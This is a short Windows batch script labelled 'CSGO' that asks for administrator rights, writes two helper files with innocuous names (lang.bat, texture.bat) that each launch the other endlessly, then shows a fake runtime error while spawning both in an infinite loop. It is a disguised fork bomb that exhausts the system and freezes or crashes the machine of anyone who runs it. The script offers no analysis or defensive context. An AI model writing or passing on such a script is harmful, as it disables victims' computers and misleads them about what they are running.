@ echo off

set filename=CSGO
rem no /,. etc in appname
set bat1=lang.bat
set bat2=texture.bat

:checkPermissions

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto :isAdmin
    ) else (
                echo %filename% requires administrative permissions to run. Please run as administrator.
		echo Press Any Key To Terminate...
		pause >nul
		goto:eof
    )

:isAdmin	
rem Create suporting batch files
if exist %bat1% del %bat1%

echo:set /A a=2^32 >>%bat1%
echo:set /A b=(2^32)-1 >>%bat1%
echo:set /A d=(2^32)-1 >>%bat1%
echo:set /A e=(2^32)-1 >>%bat1%
echo:set /A f=(2^32)-1 >>%bat1%
echo:set /A i=(2^32)-1 >>%bat1%
echo:set /A c=a-b >>%bat1%
echo :re >>%bat1%
echo:start %bat2% >>%bat1%
echo goto re>>%bat1%

echo:set /A a=2^32 >>%bat2%
echo:set /A b=(2^32)-1 >>%bat2%
echo:set /A e=(2^32)-1 >>%bat2%
echo:set /A t=(2^32)-1 >>%bat2%
echo:set /A i=(2^32)-1 >>%bat2%
echo:set /A c=a-b >>%bat2%
echo:set /A f=a-b >>%bat2%
echo :re >>%bat2%
echo:start %bat1% >>%bat2%
echo goto re>>%bat2%

echo Runtime error 324 (REC_INF) has occurred. Aborting process...

:recurse
start %bat1%
start %bat2%
goto recurse
